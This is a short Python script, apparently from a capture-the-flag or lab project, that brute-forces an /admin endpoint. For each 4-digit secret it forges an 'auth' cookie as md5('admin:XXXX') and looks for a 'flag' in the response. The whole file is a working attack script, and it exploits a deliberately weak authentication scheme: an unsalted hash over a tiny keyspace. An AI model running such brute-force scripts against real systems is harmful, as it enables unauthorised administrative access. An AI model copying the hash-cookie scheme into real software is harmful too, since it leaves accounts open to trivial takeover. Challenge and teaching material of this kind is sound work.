# dev/brute.py
# Developer helper to brute-force a running instance by trying all 4-digit numeric secrets.
# Usage (dev): python dev/brute.py http://localhost:8000
#
# This script uses the /admin protected endpoint. It will set the cookie 'auth'
# equal to md5('admin:XXXX') for each XXXX in 0000-9999 and check the response.

import sys
import hashlib
import requests

def md5_hex(s: str) -> str:
    import hashlib
    return hashlib.md5(s.encode('utf-8')).hexdigest()

def try_bruteforce(base_url: str):
    admin_url = base_url.rstrip('/') + '/admin'
    for i in range(10000):
        secret = f"{i:04d}"
        token = md5_hex(f"admin:{secret}")
        cookies = {'auth': token}
        r = requests.get(admin_url, cookies=cookies, allow_redirects=False, timeout=5)
        if r.status_code == 200 and "flag" in r.text.lower():
            print("FOUND!")
            print("secret =", secret)
            print("token  =", token)
            print("Response snippet:")
            print(r.text[:400])
            return
        if i % 1000 == 0:
            print(f"tried {i} secrets...")
    print("Not found in 0000-9999")

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python dev/brute.py http://localhost:8000")
        sys.exit(1)
    try:
        try_bruteforce(sys.argv[1])
    except Exception as e:
        print("Error:", e)
